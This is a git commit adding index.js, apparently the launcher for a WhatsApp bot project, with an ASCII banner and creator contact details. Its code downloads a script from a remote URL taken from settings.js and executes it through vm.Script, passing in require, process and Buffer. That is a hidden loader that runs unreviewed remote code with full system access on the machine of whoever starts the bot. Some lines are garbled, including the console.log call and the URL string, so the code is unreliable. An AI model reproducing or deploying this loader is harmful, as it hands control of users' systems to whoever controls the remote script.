f593a3de4b1f10687ad9b000f33584f759bab3fe
kingathurofficial <mufarohwenhira@gmail.com>
2025-09-09 21:33:31 +0200

    Create index.js

---
+++ index.js
@@ -0,0 +1,31 @@
+/*
+
+$$$$$$\            $$\                                               
+$$  __$$\           $$ |                                              
+$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
+\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
+ \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
+$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
+\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
+ \______/  \______/ \_______/ \________| \_______|\__|       \______/
+
+@ Project Name
+* Creator      : King Athur ofcial
+* My Git       : https//github.com/kingathur
+* Contact      : wa.me/263714740765
+* Channel      : https://whatsapp.com/channel/0029Vb6eTQOGU3BCp0MCJC3K
+* Release Date : 25 September 2025
+// ZIMBABWEAN STAR ON TOP
+const axios = require('axios');
+const vm = require('vm');
+const config = require('./settings.js');
+
+(async () => {
+  try {
+    console.loSynchronizationySynchronizationKingtiontion Initiated !");
+    const { data: scriptCode } = await axios.get(`${config.Cindexkingathur/index.js`);
+    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
+  } catch (err) {
+    console.error("Error:", err);
+  }
+}
